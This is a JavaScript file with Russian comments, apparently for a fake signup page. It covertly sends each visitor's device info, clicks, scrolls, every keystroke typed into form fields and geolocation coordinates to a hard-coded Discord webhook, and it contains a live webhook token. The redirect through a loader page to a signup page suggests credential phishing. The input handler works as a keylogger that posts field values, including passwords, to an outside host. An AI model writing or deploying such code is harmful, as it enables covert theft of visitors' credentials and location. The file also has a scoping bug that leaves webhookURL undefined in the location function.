// scripts.js

// Функция для получения информации о пользователе
function getUserInfo() {
    const userAgent = navigator.userAgent; // Получаем информацию о браузере/устройстве
    const timestamp = new Date().toLocaleString(); // Получаем текущее время

    return {
        phoneInfo: userAgent,
        visitTime: timestamp
    };
}

// Функция для отправки данных в Discord через вебхук
function sendToDiscord(data) {
    const webhookURL = 'https://discord.com/api/webhooks/1299013641084866674/PKIfals7J4p1kYsUJCQesFHK06vZKKR_dL2T_cLvxFylqnsEweKVADcKz-N_Ej4yzNRv'; // Замените на ваш вебхук Discord

    const message = {
        content: `Новый визит:
        - Телефон: ${data.phoneInfo}
        - Время входа: ${data.visitTime}`
    };

    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(message)
    })
    .then(response => {
        if (response.ok) {
            console.log('Данные успешно отправлены в Discord');
        } else {
            console.error('Ошибка при отправке данных в Discord');
        }
    })
    .catch(error => {
        console.error('Ошибка при отправке запроса: ', error);
    });
}

// Получаем данные и отправляем их в Discord
window.onload = () => {
    const userData = getUserInfo();
    sendToDiscord(userData);
};

// Отслеживание кликов по всем кнопкам на странице
document.querySelectorAll('button').forEach(button => {
    button.addEventListener('click', (event) => {
        const actionData = {
            action: 'Клик по кнопке',
            buttonText: event.target.innerText
        };
        sendToDiscord(actionData);
    });
});

// Отслеживание скроллинга
window.addEventListener('scroll', () => {
    const scrollData = {
        action: 'Прокрутка страницы',
        scrollY: window.scrollY
    };
    sendToDiscord(scrollData);
});

// Отслеживание кликов по ссылкам
document.querySelectorAll('a').forEach(link => {
    link.addEventListener('click', (event) => {
        const linkData = {
            action: 'Клик по ссылке',
            linkHref: event.target.href
        };
        sendToDiscord(linkData);
    });
});

// Отслеживание изменения ввода в текстовых полях (например, формы)
document.querySelectorAll('input, textarea').forEach(input => {
    input.addEventListener('input', (event) => {
        const inputData = {
            action: 'Изменение ввода',
            inputType: event.target.type,
            inputValue: event.target.value
        };
        sendToDiscord(inputData);
    });
});

// Основная функция, вызываемая при нажатии на кнопку
function handleClick() {
    redirectToPage(); // Переход на первую страницу
    setTimeout(redirectBack, 6000); // Через 6 секунд перенаправляем на вторую страницу
}

// Функция для перенаправления на первую страницу
function redirectToPage() {
    window.location.href = 'loader.html'; // Замените на нужный URL
}

// Функция для перенаправления на вторую страницу через 6 секунд
function redirectBack() {
    setTimeout(function() {
        window.location.href = 'signup.html'; // Замените на нужный URL
    }, 6000);
}

// Функция для получения местоположения пользователя
function getLocationAndSendToWebhook() {
    if (navigator.geolocation) {
        // Запрашиваем местоположение
        navigator.geolocation.getCurrentPosition(sendLocationToWebhook, showError);
    } else {
        console.log("Геолокация не поддерживается этим браузером.");
    }
}

// Функция для обработки успешного получения местоположения
function sendLocationToWebhook(position) {
    // Получаем координаты
    const latitude = position.coords.latitude;
    const longitude = position.coords.longitude;

    // Формируем сообщение для отправки в Discord
    const message = {
        content: `Местоположение пользователя:\nШирота: ${latitude}\nДолгота: ${longitude}`
    };

    // Отправляем данные в вебхук Discord
    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(message)
    })
    .then(response => response.json())
    .then(data => {
        console.log('Данные успешно отправлены в Discord:', data);
    })
    .catch((error) => {
        console.error('Ошибка при отправке данных:', error);
    });
}

// Функция для обработки ошибок получения местоположения
function showError(error) {
    switch(error.code) {
        case error.PERMISSION_DENIED:
            console.log("Пользователь отклонил запрос на доступ к геолокации.");
            break;
        case error.POSITION_UNAVAILABLE:
            console.log("Информация о местоположении недоступна.");
            break;
        case error.TIMEOUT:
            console.log("Превышено время ожидания запроса.");
            break;
        case error.UNKNOWN_ERROR:
            console.log("Неизвестная ошибка.");
            break;
    }
}

// Добавляем обработчик события для кнопки получения местоположения
document.getElementById("getLocationBtn").addEventListener("click", getLocationAndSendToWebhook);
